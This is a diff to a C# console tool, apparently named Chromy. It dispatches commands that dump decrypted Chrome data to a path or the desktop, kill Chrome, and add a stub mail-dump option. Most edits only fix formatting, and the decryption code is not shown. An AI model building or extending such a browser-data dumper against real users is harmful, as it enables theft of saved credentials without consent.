@@ -61,7 +61,7 @@ namespace Chromy
             Console.Write("\n$> ");
             var cmd = Console.ReadLine().ToLower();
 
-            if(cmd == "help")
+            if (cmd == "help")
             {
                 PrintMe.PrintHelp();
             }
@@ -78,7 +78,7 @@ namespace Chromy
 
                 PrintMe.PrintInfo(" OK ", ConsoleColor.Green, $"$> DUMP DONE! {rows} Items.");
             }
-            else if(cmd.Contains("dump -p") && !cmd.Contains("-d"))
+            else if (cmd.Contains("dump -p") && !cmd.Contains("-d"))
             {
                 // DUMP PATH COMMAND 
 
@@ -88,7 +88,7 @@ namespace Chromy
                 spath[1] = spath[1].Remove(0, 1);
                 var rows = Decrypt(spath[1]);
 
-                if(rows == 0)
+                if (rows == 0)
                 {
                     PrintMe.PrintInfo("ERR ", ConsoleColor.Red, $"$> Something goes wrong.. Retry");
                     return null;
@@ -96,7 +96,7 @@ namespace Chromy
 
                 PrintMe.PrintInfo(" OK ", ConsoleColor.Green, $"$> DUMP DONE! {rows} Items.");
             }
-            else if((cmd.Contains("-d") && cmd.Contains("dump -d")) && !cmd.Contains("-p"))
+            else if ((cmd.Contains("-d") && cmd.Contains("dump -d")) && !cmd.Contains("-p"))
             {
                 // DUMP DESKTOP
                 var rows = Decrypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
@@ -107,7 +107,7 @@ namespace Chromy
                 }
                 PrintMe.PrintInfo(" OK ", ConsoleColor.Green, $"$> DUMP DONE! {rows} Items.");
             }
-            else if(cmd == "clear" && !cmd.Contains("dump -d") && !cmd.Contains("-p"))
+            else if (cmd == "clear" && !cmd.Contains("dump -d") && !cmd.Contains("-p"))
             {
                 KillChrome();
                 Thread.Sleep(20);
@@ -134,12 +134,16 @@ namespace Chromy
 
                 PrintMe.PrintInfo(" OK ", ConsoleColor.Green, $"$> CLEAR DONE!");
             }
-            else
+            else if (cmd.Contains("dump") && cmd.Contains("-m") && !cmd.Contains("-d") && !cmd.Contains("-p"))
             {
-                PrintMe.PrintInfo("ERR ", ConsoleColor.Red, $"$> Command not found. Retry.");
-            }
+                // DUMP MAIL COMMAND 
 
-            return null; 
+
+                PrintMe.PrintInfo("ERR ", ConsoleColor.Red, $"$> Not working now.");
+
+                
+            }
+            return null;
         }
 
         private static void KillChrome()
